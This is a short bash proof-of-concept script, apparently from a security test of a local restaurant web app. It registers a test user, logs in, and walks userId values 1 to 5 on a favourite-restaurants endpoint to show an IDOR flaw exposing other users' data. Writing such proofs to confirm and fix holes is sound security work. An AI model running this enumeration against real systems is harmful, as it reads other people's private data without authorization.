#!/bin/bash

# IDOR Vulnerability POC - Get Favorite Restaurants
# This POC demonstrates unauthorized access to other users' restaurant preferences

TARGET_URL="http://localhost:8080"
REGISTER_ENDPOINT="$TARGET_URL/api/register.php"
LOGIN_ENDPOINT="$TARGET_URL/api/login.php"
IDOR_ENDPOINT="$TARGET_URL/api/get_favorite_restaurants.php"

echo "[*] IDOR POC - Horizontal Privilege Escalation"
echo "[*] Target: $IDOR_ENDPOINT"
echo ""

# Register test user if needed
TEST_USER="idor_test_$(date +%s)"
TEST_PASS="testpass123"

echo "[+] Registering test user: $TEST_USER"
curl -s -X POST "$REGISTER_ENDPOINT" \
  -d "username=$TEST_USER&email=$TEST_USER@test.com&password=$TEST_PASS" > /dev/null

# Login
echo "[+] Logging in as $TEST_USER"
curl -s -c /tmp/idor_poc_cookies.txt -b /tmp/idor_poc_cookies.txt \
  -X POST "$LOGIN_ENDPOINT" \
  -d "username=$TEST_USER&password=$TEST_PASS" > /dev/null

# Test IDOR - access other users' data
echo "[+] Testing IDOR vulnerability..."
echo ""

for userid in 1 2 3 4 5; do
  echo "=== Accessing userId=$userid ==="
  RESPONSE=$(curl -s -b /tmp/idor_poc_cookies.txt \
    "$IDOR_ENDPOINT?userId=$userid")
  
  if echo "$RESPONSE" | grep -q '"success":true'; then
    USERNAME=$(echo "$RESPONSE" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)
    RESTAURANTS=$(echo "$RESPONSE" | grep -o '"restaurants":\[' | wc -l)
    echo "✓ SUCCESS: Accessed user $USERNAME's data"
    echo "  Response: $RESPONSE"
  else
    echo "✗ FAILED: Could not access userId=$userid"
  fi
  echo ""
done

echo "[!] VULNERABILITY CONFIRMED: Unauthorized access to other users' data possible"
rm -f /tmp/idor_poc_cookies.txt

